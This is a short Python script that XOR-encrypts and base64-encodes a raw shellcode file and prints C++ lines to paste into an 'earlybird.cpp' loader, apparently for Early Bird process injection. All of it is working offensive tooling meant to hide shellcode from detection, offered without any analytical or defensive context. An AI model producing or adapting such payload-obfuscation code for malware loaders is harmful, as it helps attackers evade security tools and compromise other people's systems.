#!/usr/bin/env python3
import base64
import sys

# XOR key (matches earlybird.cpp)
XOR_KEY = 0xAA

def xor_shellcode(shellcode_bytes, key):
    return bytes(b ^ key for b in shellcode_bytes)

# Read raw shellcode file
with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

print(f"[+] Original shellcode size: {len(shellcode)} bytes")

# XOR encrypt
encrypted = xor_shellcode(shellcode, XOR_KEY)

# Base64 encode
b64_encoded = base64.b64encode(encrypted).decode()

# Output C++ ready code
print("\n[+] Copy these 2 lines to earlybird.cpp:")
print(f'#define XOR_KEY 0x{XOR_KEY:02X}')
print('const char* b64_shellcode = "' + b64_encoded + '";')
print(f"\n[+] Encoded size: {len(b64_encoded)} chars")
